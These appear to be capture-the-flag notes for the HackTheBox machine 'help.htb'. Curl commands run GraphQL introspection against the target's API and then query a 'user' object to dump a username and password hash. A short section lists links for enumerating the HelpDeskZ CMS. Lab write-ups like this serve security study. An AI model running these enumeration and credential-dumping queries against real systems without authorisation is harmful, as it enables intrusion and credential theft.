### Enum Graphql
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
* https://graphql.org/learn/introspection/

```bash
curl -s 'http://10.129.26.37:3000/graphql' -H 'User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/json' -d '{ "query": "{ __schema { queryType { name, fields { name, description } } } }" }' | jq -c .
{"data":{"__schema":{"queryType":{"name":"Query","fields":[{"name":"user","description":""}]}}}}

curl -s 'http://10.129.26.37:3000/graphql' -H 'User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/json' -d '{ "query": "{ __schema { types { name, fields { name } } } }" }' | jq -c .
{"data":{"__schema":{"types":[{"name":"Query","fields":[{"name":"user"}]},{"name":"User","fields":[{"name":"username"},{"name":"password"}]},{"name":"String","fields":null},{"name":"__Schema","fields":[{"name":"types"},{"name":"queryType"},{"name":"mutationType"},{"name":"subscriptionType"},{"name":"directives"}]},{"name":"__Type","fields":[{"name":"kind"},{"name":"name"},{"name":"description"},{"name":"fields"},{"name":"interfaces"},{"name":"possibleTypes"},{"name":"enumValues"},{"name":"inputFields"},{"name":"ofType"}]},{"name":"__TypeKind","fields":null},{"name":"Boolean","fields":null},{"name":"__Field","fields":[{"name":"name"},{"name":"description"},{"name":"args"},{"name":"type"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__InputValue","fields":[{"name":"name"},{"name":"description"},{"name":"type"},{"name":"defaultValue"}]},{"name":"__EnumValue","fields":[{"name":"name"},{"name":"description"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__Directive","fields":[{"name":"name"},{"name":"description"},{"name":"locations"},{"name":"args"}]},{"name":"__DirectiveLocation","fields":null}]}}}

curl help.htb:3000/graphql -H "Content-Type: application/json" -d '{ "query": "{ user { username password } }" }' | jq .

{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}

```

```Graphql
{
  __schema {
    types {
      name,
      fields{name}
    }
  }
}

{
  __type(name: "User") {
    name,
    fields {name}
  }
}

{
  user {
    username, password
  }
}

{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}s
```

### Enum CMS Github
* https://github.com/A1vinSmith/HelpDeskZ
* http://help.htb/support/UPGRADING.txt
* http://help.htb/support/readme.html